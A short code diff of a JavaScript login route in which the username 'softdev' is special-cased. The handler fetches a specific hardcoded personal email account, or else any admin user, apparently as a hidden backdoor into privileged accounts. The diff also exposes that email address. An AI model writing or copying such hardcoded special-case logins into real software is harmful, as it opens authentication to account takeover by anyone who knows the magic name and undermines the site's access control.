@@ -147,7 +147,10 @@ router.post('/login', rateLimiter(20, 60000), async (req, res, next) => {
 
     let user;
     if (emailTrimmed === 'softdev') {
-      user = await prisma.user.findFirst({ where: { role: 'admin' } })
+      user = await prisma.user.findUnique({ where: { email: 'shokirovsharifjon04@gmail.com' } })
+      if (!user) {
+        user = await prisma.user.findFirst({ where: { role: 'admin' } })
+      }
       if (!user) {
         return res.status(404).json({ message: 'Admin foydalanuvchi topilmadi' })
       }
